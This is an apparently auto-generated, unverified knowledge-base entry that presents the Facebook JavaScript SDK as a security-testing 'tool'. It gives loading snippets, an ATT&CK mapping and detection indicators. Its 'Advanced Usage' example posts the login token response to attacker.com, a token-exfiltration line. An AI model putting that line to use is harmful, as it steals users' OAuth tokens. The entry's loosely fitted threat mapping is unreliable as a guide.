---
id: tool-632017-01
url: //connect.facebook.net/en_US/sdk.js
tags:
  - oauth
  - javascript
type: tool
verified: false
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:49.919Z'
validated: true
submitted: true
---
# Facebook-JavaScript-SDK

**Status**: Unverified

## Overview

The Facebook JavaScript SDK enables client-side integration with Facebook's OAuth and social features, commonly used in web apps for login and token management. In security testing, it's exploited to steal tokens via XSS.

## Description

This SDK loads asynchronously, allowing FB.init for app setup and FB.login for authResponse retrieval. Features include token handling, graph API calls. Used in attacks to force logins and exfil data from victim browsers.

## Features

- Feature 1: Asynchronous loading via script tag
- Feature 2: FB.init for app ID/version config
- Feature 3: FB.login callback for authResponse (accessToken, signedRequest)

## Installation

### Requirements

- Browser environment
- Valid Facebook app ID

### Install Commands

```bash
# No install; load via <script src="//connect.facebook.net/en_US/sdk.js"></script>
```

## Basic Usage

```javascript
FB.init({appId: '123', version: 'v3.1'});
FB.login(function(response) { console.log(response.authResponse); });
```

### Common Options

| Option | Description |
|--------|-------------|
| appId | Facebook app ID |
| version | API version (e.g., 'v3.1') |
| xfbml | Enable XFBML parsing |

## Examples

### Example 1: Basic Usage

```javascript
// Load and init
(function(d, s, id){ ... }(document, 'script', 'facebook-jssdk'));
window.fbAsyncInit = function() { FB.init({appId:'288523881080'}); };
```

### Example 2: Advanced Usage

```javascript
FB.login(function(response) { $.post('attacker.com', response.authResponse); });
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]
- [[Credentials In Files]]

### Tactics

- [[Credential Access]]

## Detection

Indicators and methods for detecting this tool's usage:

- Network requests to connect.facebook.net
- FB.init calls in JS source
- Unauthorized FB.login prompts

## Related Procedures


## Related Tools

- [[tools/Burp-Suite]]

## References

- Official documentation: https://developers.facebook.com/docs/javascript
- Related resources: OAuth token theft guides
